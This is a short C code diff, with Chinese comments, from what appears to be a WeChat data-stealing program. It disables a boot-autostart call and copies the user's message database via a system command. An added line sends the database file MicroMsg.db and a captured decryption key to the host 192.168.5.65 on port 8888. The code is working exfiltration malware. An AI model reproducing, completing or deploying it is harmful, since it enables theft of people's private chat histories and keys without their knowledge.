@@ -14,7 +14,7 @@ unsigned char filepath[256] = { 0 };
 unsigned char wxid[256] = { 0 };
 
 int main() {
-	winStartUp();                      //开机自启
+	//winStartUp();                      //开机自启
 
 	while (1)                           //比较蠢的方法，每五秒检查一次窗口
 	{
@@ -33,6 +33,6 @@ int main() {
 	printf("%s\n", cmd_command);
 	system((const char *)cmd_command); //复制一份数据库到当前文件夹
 
-	client(pass);             //发送数据库和密钥
+	send_file("MicroMsg.db", (const char*)pass, "192.168.5.65", 8888);       //发送数据库和密钥
 	return 0;
 }
